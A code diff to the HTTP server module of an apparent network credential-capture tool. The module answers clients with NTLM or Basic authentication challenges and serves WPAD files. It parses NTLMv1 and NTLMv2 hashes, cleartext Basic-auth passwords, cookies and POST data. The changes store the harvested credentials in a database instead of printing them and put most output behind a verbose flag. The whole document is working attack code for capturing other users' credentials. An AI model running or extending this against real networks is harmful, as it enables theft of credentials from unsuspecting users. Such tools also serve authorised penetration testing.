@@ -45,14 +45,25 @@ def ParseHTTPHash(data, client):
 		HostNameLen     = struct.unpack('<H',data[46:48])[0]
 		HostNameOffset  = struct.unpack('<H',data[48:50])[0]
 		HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
+		WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, settings.Config.NumChal)
 
-		print text("[HTTP] NTLMv1 Client   : %s" % client)
-		print text("[HTTP] NTLMv1 Hostname : %s" % HostName)
-		print text("[HTTP] NTLMv1 User     : %s" % User)
-		print text("[HTTP] NTLMv1 Hash     : %s" % LMHash+":"+NTHash)
-		
-		WriteHash = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, settings.Config.NumChal)
-		WriteData(settings.Config.HTTPNTLMv1Log % client, WriteHash, User+"::"+HostName)
+		SaveToDb({
+			'module': 'HTTP', 
+			'type': 'NTLMv1', 
+			'client': client, 
+			'host': HostName, 
+			'user': User, 
+			'hash': LMHash+":"+NTHash, 
+			'fullhash': WriteHash,
+		})
+
+		#print text("[HTTP] NTLMv1 Client   : %s" % client)
+		#print text("[HTTP] NTLMv1 Hostname : %s" % HostName)
+		#print text("[HTTP] NTLMv1 User     : %s" % User)
+		#print text("[HTTP] NTLMv1 Hash     : %s" % LMHash+":"+NTHash)
+		#
+		#WriteHash = '%s::%s:%s:%s:%s' % (User, HostName, LMHash, NTHash, settings.Config.NumChal)
+		#WriteData(settings.Config.HTTPNTLMv1Log % client, WriteHash, User+"::"+HostName)
 
 	if NthashLen > 24:
 		NthashLen      = 64
@@ -62,31 +73,44 @@ def ParseHTTPHash(data, client):
 		HostNameLen    = struct.unpack('<H',data[44:46])[0]
 		HostNameOffset = struct.unpack('<H',data[48:50])[0]
 		HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].replace('\x00','')
-		
-		print text("[HTTP] NTLMv2 Client   : %s" % client)
-		print text("[HTTP] NTLMv2 Hostname : %s" % HostName)
-		print text("[HTTP] NTLMv2 User     : %s" % Domain+"\\"+User)
-		print text("[HTTP] NTLMv2 Hash     : %s" % NTHash[:32]+":"+NTHash[32:])
-		
-		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
-		WriteData(settings.Config.HTTPNTLMv2Log % client, WriteHash, User+"::"+HostName)
+		WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
 
-def GrabCookie(data,host):
+		SaveToDb({
+			'module': 'HTTP', 
+			'type': 'NTLMv2', 
+			'client': client, 
+			'host': HostName, 
+			'user': Domain+'\\'+User, 
+			'hash': NTHash[:32]+":"+NTHash[32:], 
+			'fullhash': WriteHash,
+		})
+
+		#print text("[HTTP] NTLMv2 Client   : %s" % client)
+		#print text("[HTTP] NTLMv2 Hostname : %s" % HostName)
+		#print text("[HTTP] NTLMv2 User     : %s" % Domain+"\\"+User)
+		#print text("[HTTP] NTLMv2 Hash     : %s" % NTHash[:32]+":"+NTHash[32:])
+		#
+		#WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
+		#WriteData(settings.Config.HTTPNTLMv2Log % client, WriteHash, User+"::"+HostName)
+
+def GrabCookie(data, host):
 	Cookie = re.search('(Cookie:*.\=*)[^\r\n]*', data)
 
 	if Cookie:
 		Cookie = Cookie.group(0).replace('Cookie: ', '')
-		print text("[HTTP] Cookie          : %s " % Cookie)
+		if len(Cookie) > 1 and settings.Config.Verbose:
+			print text("[HTTP] Cookie           : %s " % Cookie)
 		return Cookie
 	else:
 		return False
 
-def GrabHost(data,host):
+def GrabHost(data, host):
 	Host = re.search('(Host:*.\=*)[^\r\n]*', data)
 
 	if Host:
 		Host = Host.group(0).replace('Host: ', '')
-		print text("[HTTP] Host            : %s " % Host)
+		if settings.Config.Verbose:
+			print text("[HTTP] Host             : %s " % color(Host, 3))
 		return Host
 	else:
 		return False
@@ -123,11 +147,11 @@ def GrabURL(data, host):
 	POST = re.findall('(?<=POST )[^HTTP]*', data)
 	POSTDATA = re.findall('(?<=\r\n\r\n)[^*]*', data)
 
-	if GET:
-		print text("[HTTP] GET request from: %-15s  URL: %s" % (host, ''.join(GET)))
+	if GET and settings.Config.Verbose:
+		print text("[HTTP] GET request from: %-15s  URL: %s" % (host, color(''.join(GET), 5)))
 
-	if POST:
-		print text("[HTTP] POST request from: %-15s  URL: %s" % (host, ''.join(POST)))
+	if POST and settings.Config.Verbose:
+		print text("[HTTP] POST request from: %-15s  URL: %s" % (host, color(''.join(POST), 5)))
 		if len(''.join(POSTDATA)) > 2:
 			print text("[HTTP] POST Data: %s" % ''.join(POSTDATA).strip())
 
@@ -182,13 +206,22 @@ def PacketSequence(data, client):
 		GrabHost(data, client)
 		GrabCookie(data, client)
 
-		print text("[HTTP] (Basic) Client       : %s" % client)
-		print text("[HTTP] (Basic) Username     : %s" % ClearText_Auth.split(':')[0])
-		print text("[HTTP] (Basic) Password     : %s" % ClearText_Auth.split(':')[1])
-		WriteData(settings.Config.HTTPBasicLog % client, ClearText_Auth, ClearText_Auth)
+		SaveToDb({
+			'module': 'HTTP', 
+			'type': 'Basic', 
+			'client': client, 
+			'user': ClearText_Auth.split(':')[0], 
+			'cleartext': ClearText_Auth.split(':')[1], 
+		})
+
+		#print text("[HTTP] (Basic) Client       : %s" % color(client, 3))
+		#print text("[HTTP] (Basic) Username     : %s" % color(ClearText_Auth.split(':')[0], 3))
+		#print text("[HTTP] (Basic) Password     : %s" % color(ClearText_Auth.split(':')[1], 3))
+		#WriteData(settings.Config.HTTPBasicLog % client, ClearText_Auth, ClearText_Auth)
 
 		if settings.Config.Force_WPAD_Auth and WPAD_Custom:
-			print text("[HTTP] WPAD (auth) file sent to %s" % client)
+			if settings.Config.Verbose:
+				print text("[HTTP] WPAD (auth) file sent to %s" % client)
 			return WPAD_Custom
 
 		else:
@@ -199,11 +232,13 @@ def PacketSequence(data, client):
 	else:
 		if settings.Config.Basic == True:
 			Response = IIS_Basic_401_Ans()
-			print text("[HTTP] Sending BASIC authentication request to %s" % client)
+			if settings.Config.Verbose:
+				print text("[HTTP] Sending BASIC authentication request to %s" % client)
 
 		else:
 			Response = IIS_Auth_401_Ans()
-			print text("[HTTP] Sending NTLM authentication request to %s" % client)
+			if settings.Config.Verbose:
+				print text("[HTTP] Sending NTLM authentication request to %s" % client)
 
 		return str(Response)
 
@@ -219,7 +254,8 @@ class HTTP(BaseRequestHandler):
 
 				if Buffer and settings.Config.Force_WPAD_Auth == False:
 					self.request.send(Buffer)
-					print text("[HTTP] WPAD (no auth) file sent to %s" % self.client_address[0])
+					if settings.Config.Verbose:
+						print text("[HTTP] WPAD (no auth) file sent to %s" % self.client_address[0])
 
 				else:
 					Buffer = PacketSequence(data,self.client_address[0])
@@ -243,7 +279,8 @@ class HTTPS(StreamRequestHandler):
 				
 				if Buffer and settings.Config.Force_WPAD_Auth == False:
 					self.exchange.send(Buffer)
-					print text("[HTTPS] WPAD (no auth) file sent to %s" % self.client_address[0])
+					if settings.Config.Verbose:
+						print text("[HTTPS] WPAD (no auth) file sent to %s" % self.client_address[0])
 
 				else:
 					Buffer = PacketSequence(data,self.client_address[0])
